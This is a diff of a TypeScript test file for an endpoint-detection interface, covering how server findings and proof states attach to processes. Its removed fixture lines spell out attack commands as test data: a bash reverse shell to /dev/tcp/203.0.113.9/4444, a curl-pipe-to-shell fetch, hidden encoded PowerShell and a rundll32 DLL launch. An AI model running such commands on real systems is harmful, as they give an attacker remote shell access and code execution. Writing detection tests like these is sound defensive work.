@@ -1,78 +1,109 @@
 import { describe, expect, it } from 'vitest'
-import type { ApiEvent } from './api'
+import type { ApiEvent, WindowView } from './api'
+import { findingOf, findingsByProcess, proofOf, releaseOf, type Finding } from './findings'
 import { buildProcessModel, severity } from './process-tree'
 
-let serial = 0
+const EVIDENCE = {
+  rule: 'server-child',
+  title: 'Server process started a shell',
+  technique: 'T1505.003',
+  level: 'high',
+  pid: 21,
+  started_at: 2,
+  image: '/bin/sh',
+  command: '/bin/sh -c id',
+  parent: 'nginx',
+  subject: null,
+  autostart: null,
+  trigger: 7,
+  window: 3,
+  proof: 'pending',
+}
 
+function finding(more: Record<string, unknown> = {}): Finding {
+  return findingOf({ ...EVIDENCE, ...more })!
+}
+
+function windowView(proof: string, proven: boolean): WindowView {
+  return {
+    header: { epoch: 1, window: 3, first_index: 6, count: 2, fresh: false, gap: false, prev_head: 'a', root: 'b', head: 'c' },
+    received_at: 100,
+    proving: proof !== 'none',
+    proof,
+    events: [],
+    releases: [{ trigger: 7, rule: 'server-child', title: 'Server process started a shell', technique: 'T1505.003', level: 'high', context: [0], proven }],
+  }
+}
+
+let serial = 0
 function event(type: string, timestamp: number, data: Record<string, unknown>): ApiEvent {
   serial += 1
   return { id: `f${serial}`, agent_id: 'a1', event_type: type, timestamp, data: JSON.stringify(data), received_at: timestamp }
 }
+const run = (timestamp: number, pid: number, ppid: number, path: string) =>
+  event('process', timestamp, { action: 'Create', pid, ppid, executable_path: path, command_line: [path], uid: 33 })
 
-const run = (timestamp: number, pid: number, ppid: number, path: string, args: string[] = []) =>
-  event('process', timestamp, { action: 'Create', pid, ppid, executable_path: path, command_line: [path, ...args], uid: 1000 })
-const connect = (timestamp: number, pid: number) =>
-  event('network', timestamp, { action: 'Connect', pid, protocol: 'tcp', dest_ip: '203.0.113.9', dest_port: 443, bytes_sent: 1, bytes_received: 1 })
-const write = (timestamp: number, pid: number, path: string) => event('file', timestamp, { action: 'Write', pid, path })
-
-function rulesFor(events: ApiEvent[], pid: number): string[] {
-  const model = buildProcessModel(events)
-  return model.all.find((proc) => proc.pid === pid)!.findings.map((finding) => finding.rule)
-}
-
-const SYSTEM = 'C:\\Windows\\System32\\'
-const POWERSHELL = `${SYSTEM}WindowsPowerShell\\v1.0\\powershell.exe`
-
-describe('detection rules', () => {
-  it('reads a macro dropper end to end', () => {
-    const events = [
-      run(1, 10, 0, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'),
-      run(2, 11, 10, POWERSHELL, ['-nop', '-w', 'hidden', '-enc', 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA']),
-      connect(3, 11),
-      write(4, 11, 'C:\\Users\\Public\\update.dll'),
-      run(5, 12, 11, `${SYSTEM}rundll32.exe`, ['C:\\Users\\Public\\update.dll,Start']),
-      connect(6, 12),
-    ]
-    expect(rulesFor(events, 11)).toEqual(['office-child', 'encoded-command', 'drops-executable', 'hidden-window', 'shell-network'])
-    expect(rulesFor(events, 12)).toEqual(['proxy-network', 'proxy-loads-writable'])
-    expect(rulesFor(events, 10)).toEqual([])
+describe('findingOf', () => {
+  it('reads what the server tells about a rule that fired, with where it sits in the chain', () => {
+    expect(finding()).toEqual({
+      rule: 'server-child',
+      title: 'Server process started a shell',
+      technique: 'T1505.003',
+      level: 'high',
+      processKey: '21@2',
+      image: '/bin/sh',
+      autostart: null,
+      subject: null,
+      trigger: 7,
+      window: 3,
+      proven: false,
+    })
+    expect(finding({ level: 'medium', proof: 'verified' })).toMatchObject({ level: 'medium', proven: true })
+    expect(finding({ autostart: 'cron', subject: 'sysupdate', pid: 0 })).toMatchObject({ autostart: 'cron', subject: 'sysupdate' })
   })
 
-  it('reads a web shell and a reverse shell on Linux', () => {
-    const events = [
-      run(1, 20, 0, '/usr/sbin/nginx'),
-      run(2, 21, 20, '/bin/sh', ['-c', 'id']),
-      run(3, 22, 21, '/bin/bash', ['-c', 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1']),
-      run(4, 23, 0, '/bin/sh', ['-c', 'curl -s http://203.0.113.9/a | sh']),
-      run(5, 24, 0, '/tmp/.x/kworker'),
-    ]
-    expect(rulesFor(events, 21)).toEqual(['server-child'])
-    expect(rulesFor(events, 22)).toEqual(['reverse-shell'])
-    expect(rulesFor(events, 23)).toEqual(['fetch-and-run'])
-    expect(rulesFor(events, 24)).toEqual(['writable-image'])
+  it('reads nothing out of evidence that is not a finding', () => {
+    expect(findingOf({ reason: 'the agent service was stopped' })).toBeNull()
+    expect(findingOf({})).toBeNull()
+  })
+})
+
+describe('findings of a process', () => {
+  it('come from the server and land on the process they name, the high ones first', () => {
+    const findings = [finding({ rule: 'shell-network', level: 'medium', trigger: 9 }), finding(), finding(), finding({ rule: 'autostart-fetch', autostart: 'cron', pid: 0 })]
+    expect(findingsByProcess(findings).get('21@2')!.map((found) => found.rule)).toEqual(['server-child', 'shell-network'])
+    expect([...findingsByProcess(findings).keys()]).toEqual(['21@2'])
+
+    const model = buildProcessModel([run(1, 20, 0, '/usr/sbin/nginx'), run(2, 21, 20, '/bin/sh')], findings)
+    expect(model.all.map((proc) => [proc.name, proc.findings.map((found) => found.rule), severity(proc)])).toEqual([
+      ['nginx', [], 'plain'],
+      ['sh', ['server-child', 'shell-network'], 'alert'],
+    ])
   })
 
-  it('stays quiet on ordinary developer and server work', () => {
-    const events = [
-      run(1, 30, 0, 'C:\\BuildAgent\\bin\\buildagent.exe'),
-      run(2, 31, 30, `${SYSTEM}cmd.exe`, ['/c', 'npm', 'ci']),
-      run(3, 32, 31, 'C:\\Program Files\\nodejs\\node.exe', ['install.js']),
-      connect(4, 32),
-      run(5, 33, 0, 'C:\\Python312\\python.exe', ['worker.py']),
-      connect(6, 33),
-      run(7, 34, 0, 'C:\\Program Files\\PowerShell\\7\\pwsh.exe'),
-      run(8, 35, 0, `${SYSTEM}rundll32.exe`, [`${SYSTEM}shell32.dll,Control_RunDLL`]),
-      run(9, 36, 0, '/usr/bin/curl', ['-o', '/tmp/report.csv', 'https://example.com/report.csv']),
-    ]
-    const model = buildProcessModel(events)
+  it('are none when the server told none, whatever the process looks like', () => {
+    const model = buildProcessModel([run(1, 20, 0, '/usr/sbin/nginx'), run(2, 21, 20, '/bin/sh'), run(3, 22, 0, '/tmp/.x/kworker')])
     expect(model.all.flatMap((proc) => proc.findings)).toEqual([])
-    expect(model.all.map((proc) => severity(proc))).toEqual(['plain', 'plain', 'link', 'link', 'plain', 'plain', 'plain'])
+  })
+})
+
+describe('proofOf', () => {
+  it('follows the release in its window, and the evidence until the window is known', () => {
+    expect(proofOf(finding(), undefined)).toBe('pending')
+    expect(proofOf(finding({ proof: 'verified' }), undefined)).toBe('verified')
+    expect(proofOf(finding(), windowView('pending', false))).toBe('pending')
+    expect(proofOf(finding(), windowView('verified', true))).toBe('verified')
+    expect(proofOf(finding(), windowView('none', false))).toBe('none')
   })
 
-  it('rates a shell that only talks to the network as worth a look, not as an alert', () => {
-    const events = [run(1, 40, 0, '/bin/bash', ['deploy.sh']), connect(2, 40)]
-    const model = buildProcessModel(events)
-    expect(model.all[0]!.findings.map((finding) => [finding.rule, finding.level])).toEqual([['shell-network', 'medium']])
-    expect(severity(model.all[0]!)).toBe('warn')
+  it('tells a release the proof left out from one it holds, in a window whose proof did not match', () => {
+    expect(proofOf(finding(), windowView('mismatch', false))).toBe('mismatch')
+    expect(proofOf(finding(), windowView('mismatch', true))).toBe('verified')
+  })
+
+  it('finds the release by rule and trigger', () => {
+    expect(releaseOf(finding(), windowView('pending', false))?.context).toEqual([0])
+    expect(releaseOf(finding({ trigger: 8 }), windowView('pending', false))).toBeUndefined()
+    expect(releaseOf(finding({ rule: 'reverse-shell' }), windowView('pending', false))).toBeUndefined()
   })
 })
